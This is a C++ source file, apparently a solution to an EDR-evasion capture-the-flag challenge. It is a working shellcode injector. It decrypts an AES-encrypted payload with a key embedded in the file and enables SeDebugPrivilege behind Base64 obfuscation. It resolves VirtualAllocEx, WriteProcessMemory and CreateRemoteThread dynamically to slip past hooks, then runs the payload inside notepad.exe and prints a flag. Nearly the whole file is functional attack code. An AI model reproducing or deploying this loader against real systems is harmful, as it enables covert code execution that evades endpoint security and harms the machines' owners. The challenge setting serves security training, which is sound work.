#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#include <winuser.h>

// =======================================================================
// =======================================================================

char* Base64DecString(const char* base64String) {
	// Convert the Base64 string to a BYTE array
	DWORD dataSize = 0;
	CryptStringToBinaryA(base64String, 0, CRYPT_STRING_BASE64, NULL, &dataSize, NULL, NULL);

	// Allocate memory for the decoded data
	BYTE* decodedData = (BYTE*)malloc(dataSize);
	if (!decodedData) {
		return NULL;  // Memory allocation failed
	}

	CryptStringToBinaryA(base64String, 0, CRYPT_STRING_BASE64, decodedData, &dataSize, NULL, NULL);

	// Null-terminate the decoded data
	decodedData[dataSize] = '\0';

	// Return the dynamically allocated string
	return reinterpret_cast<char*>(decodedData);
}


typedef BOOL(WINAPI* pVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

typedef HANDLE(WINAPI* pCreateRemoteThread)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
	);

typedef LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);




#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
	USHORT            Length;
	USHORT            MaximumLength;
	PWSTR             Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
	ULONG            Length;
	HANDLE           RootDirectory;
	PUNICODE_STRING  ObjectName;
	ULONG            Attributes;
	PVOID            SecurityDescriptor;
	PVOID            SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
	PVOID            UniqueProcess;
	PVOID            UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef NTSTATUS(WINAPI* pNtOpenProcess)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId
	);

typedef BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

typedef VOID(WINAPI* pRtlMoveMemory)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length
	);


// ====================================
// ====================================


int get_process_id_from_szexefile(wchar_t processName[]) {
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (wcscmp(entry.szExeFile, processName) == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	else {
		printf("CreateToolhelper32Snapshot failed : %d\n", GetLastError());
		exit(1);
	}
	printf("Process not found.\n");
	exit(1);
}


void check_if_se_debug_privilege_is_enabled() {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	HANDLE hToken;
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	DWORD cbSize;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
	PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
	GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
	DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

	TOKEN_PRIVILEGES tp;

	LUID luidSeDebugPrivilege;
	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0) {
		printf("%s not owned\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}
	else {
		printf("%s owned\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luidSeDebugPrivilege;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
		printf("%s adjust token failed: %d\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="), GetLastError());
	}
	else {
		printf("%s enabled.\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}

	CloseHandle(hProcess);
	CloseHandle(hToken);
}


// CryptoAPI is still available and functional in Windows, 
// but it has been deprecated in favor of newer cryptographic APIs
int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}

	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
		return -1;
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0;
}



int main() {
	printf("Launching remote shellcode injection\n");

	// ====================================
	// Base64 -> XOR
	unsigned char shellcode[] = { 0x23, 0xe5, 0x84, 0x36, 0xce, 0x23, 0x3b, 0xe7, 0x55, 0x66, 0x8, 0x50, 0xf3, 0x44, 0xc2, 0xe8, 0x90, 0xf0, 0x8, 0x60, 0x2c, 0x2a, 0xcc, 0x7c, 0xf1, 0x6a, 0xa5, 0x48, 0x10, 0x57, 0x10, 0x7e, 0x10, 0x24, 0x5, 0x90, 0x40, 0x14, 0x7d, 0xd3, 0xba, 0x4e, 0x7f, 0x5, 0xb7, 0x17, 0xa3, 0x4, 0x91, 0x5, 0x97, 0xd7, 0xcb, 0xa2, 0x34, 0x7c, 0x90, 0xc9, 0x4f, 0x65, 0x9d, 0x18, 0x29, 0x15, 0xd8, 0xf9, 0x1d, 0xed, 0x96, 0xc4, 0x1f, 0xee, 0x2c, 0x80, 0xc8, 0x15, 0x4b, 0x68, 0x46, 0xa0, 0xe8, 0xc0, 0xb8, 0x5f, 0x5e, 0xd5, 0x5d, 0x7d, 0xd2, 0x52, 0x9b, 0x20, 0x76, 0xe0, 0xe0, 0x52, 0x23, 0xdd, 0x1a, 0x39, 0x5b, 0x66, 0x8c, 0x26, 0x9e, 0xef, 0xf, 0xfd, 0x26, 0x32, 0x30, 0xa0, 0xf2, 0x8c, 0x2f, 0xa5, 0x9, 0x2, 0x1c, 0xfe, 0x4a, 0xe8, 0x81, 0xae, 0x27, 0xcf, 0x2, 0xaf, 0x18, 0x54, 0x3c, 0x97, 0x35, 0xfe, 0xaf, 0x79, 0x35, 0xfa, 0x99, 0x3c, 0xca, 0x18, 0x8d, 0xa1, 0xac, 0x2e, 0x1e, 0x78, 0xb6, 0x4, 0x79, 0x5e, 0xa7, 0x6d, 0x7f, 0x6e, 0xa3, 0x34, 0x8b, 0x68, 0x6d, 0x2a, 0x26, 0x49, 0x1e, 0xda, 0x5e, 0xe4, 0x77, 0x29, 0x6e, 0x15, 0x9, 0x69, 0x8b, 0x8d, 0xbd, 0x42, 0xb6, 0xd9, 0xb0, 0x90, 0xd8, 0xa1, 0xb9, 0x37, 0x80, 0x8c, 0x5d, 0xaf, 0x98, 0x11, 0xef, 0xe1, 0xcf, 0xec, 0xe7, 0xc5, 0x58, 0x73, 0xf, 0xce, 0x1e, 0x27, 0x9e, 0xc0, 0x8a, 0x36, 0xd5, 0x6b, 0x9d, 0x52, 0xe, 0x68, 0x30, 0x7c, 0x45, 0x7c, 0xb3, 0xc1, 0x3f, 0x88, 0xdc, 0x78, 0x2, 0xe6, 0xbf, 0x45, 0x2d, 0x56, 0x76, 0x15, 0xc8, 0x4c, 0xe2, 0xcd, 0xa4, 0x46, 0x38, 0x6b, 0x41, 0x2b, 0xdf, 0x24, 0x2c, 0xf1, 0x82, 0x78, 0xd1, 0xc4, 0x83, 0x7f, 0x33, 0xb5, 0x8c, 0xf7, 0xac, 0x30, 0x14, 0x0, 0x6f, 0xba, 0xf7, 0x13, 0x51, 0x6a, 0x17, 0x1c, 0xf7, 0xcd, 0x43, 0x79, 0xc2, 0x57, 0xa0, 0x9c, 0x7b, 0x12, 0xce, 0x45, 0x41, 0x4e, 0xb7, 0x6b, 0xbd, 0x22, 0xc, 0xfb, 0x88, 0x2a, 0x4c, 0x2, 0x84, 0xf4, 0xca, 0x26, 0x62, 0x48, 0x6e, 0x9b, 0x3b, 0x85, 0x22, 0xff, 0xf0, 0x4f, 0x55, 0x7b, 0xc3, 0xf4, 0x9d, 0x2d, 0xe8, 0xb6, 0x44, 0x4a, 0x23, 0x2d, 0xf9, 0xe1, 0x6, 0x1c, 0x74, 0x23, 0x6, 0xdb, 0x3c, 0x3c, 0xa6, 0xce, 0xcf, 0x38, 0xae, 0x87, 0xd1, 0x8 };

	char key[] = { 0xc0, 0xa6, 0x8b, 0x1b, 0x59, 0x92, 0xcf, 0x6b, 0xef, 0x96, 0xe7, 0xd7, 0x33, 0x65, 0xda, 0x84 };
	unsigned int shellcode_len = sizeof(shellcode);
	// ====================================



	// DO NOT REMOVE
	// When loading a DLL remotely, its content won't apply until all DLL's are loaded
	// For some reason it leads to a race condition which is not part of the challenge
	// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)
	Sleep(5000);
	// DO NOT REMOVE
	check_if_se_debug_privilege_is_enabled();

	
	// ===========================================

	
	DWORD processId; 
	wchar_t processName[] = L"notepad.exe";
	processId = get_process_id_from_szexefile(processName);
	printf("Injecting to PID: %i\n", processId);


	OBJECT_ATTRIBUTES oa;
	CLIENT_ID cid;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)processId;
	cid.UniqueThread = 0;

	BOOL rv;
	DWORD oldprotect = 0;

	pVirtualAllocEx VirtualAllocEx_f = reinterpret_cast<pVirtualAllocEx>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAllocEx"));

	pCreateRemoteThread CreateRemoteThread_f = reinterpret_cast<pCreateRemoteThread>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateRemoteThread"));

	pWriteProcessMemory WriteProcessMemory_f = reinterpret_cast<pWriteProcessMemory>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WriteProcessMemory"));

	pNtOpenProcess NtOpenProcess_f = reinterpret_cast<pNtOpenProcess>(
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtOpenProcess"));

	pVirtualProtect VirtualProtect_f = reinterpret_cast<pVirtualProtect>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect"));

	pRtlMoveMemory RtlMoveMemory_f = reinterpret_cast<pRtlMoveMemory>(
		GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "RtlMoveMemory"));
	
	
	HANDLE processHandle = NULL;
	NtOpenProcess_f(&processHandle, PROCESS_ALL_ACCESS, &oa, &cid);
	printf("VirtualAllocEx\n");

	if (processHandle == NULL) return -1;


	// Decrypt payload
	AESDecrypt((char*)shellcode, shellcode_len, (char*)key, sizeof(key));

	PVOID remoteBuffer = VirtualAllocEx_f(processHandle, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("WriteProcessMemory\n");
	WriteProcessMemory_f(processHandle, remoteBuffer, shellcode, shellcode_len, NULL);

	printf("CreateRemoteThread\n");
	rv = VirtualProtect_f(shellcode, shellcode_len, PAGE_EXECUTE_READWRITE, &oldprotect);
	HANDLE remoteThread = CreateRemoteThread_f(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	
	// If all good, we launch the payload
	if(rv != 0) {
		WaitForSingleObject(processHandle, -1);
		CloseHandle(remoteThread);
	}

	printf("Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\n");
	printf("Expect more checks in the upcoming weeks ;)\n");
	CloseHandle(processHandle);
	return 0;
}